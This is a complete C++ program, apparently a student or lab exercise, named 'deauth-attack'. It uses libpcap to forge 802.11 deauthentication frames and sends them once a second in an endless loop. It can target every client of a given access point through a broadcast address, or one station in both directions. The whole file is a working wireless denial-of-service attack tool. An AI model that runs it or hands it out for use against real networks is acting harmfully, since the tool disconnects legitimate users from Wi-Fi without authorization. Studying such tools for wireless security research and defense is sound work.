#include <iostream>
#include <pcap.h>
#include <cstdio>
#include "mac.h"
#include "header.h"
#include <unistd.h>

using namespace std;

void usage() {
    cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>]" << endl;
    cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << endl;
}

int send_deauthpacket(char *dev, char *apmac, char *stmac, int argc) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    struct deauthpacket packet;

    packet.radio.version = 0x00;
    packet.radio.pad = 0x00;
    packet.radio.len = 0x08;
    packet.radio.present = 0x00;
    packet.deauth.fc = 0xc0;
    packet.deauth.dur = 0x00;
    packet.deauth.seq = 0x00;
    packet.wireless.reason = 0x00;

    while (true) {
        if (argc == 3) {
            packet.deauth.dest = Mac("ff:ff:ff:ff:ff:ff");
            packet.deauth.source = Mac(apmac);
            packet.deauth.bssid = Mac(apmac);
        }
        if (argc == 4) {
            packet.deauth.dest = Mac(stmac);
            packet.deauth.source = Mac(apmac);
            packet.deauth.bssid = Mac(apmac);
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(deauthpacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                break;
            }
            sleep(1);
            packet.deauth.dest = Mac(apmac);
            packet.deauth.source = Mac(stmac);
            packet.deauth.bssid = Mac(stmac);
        }

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(deauthpacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        sleep(1);
    }

    pcap_close(handle);

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 3 || argc > 4) {
        usage();
        return -1;
    }
    send_deauthpacket(argv[1], argv[2], argv[3], argc);
}
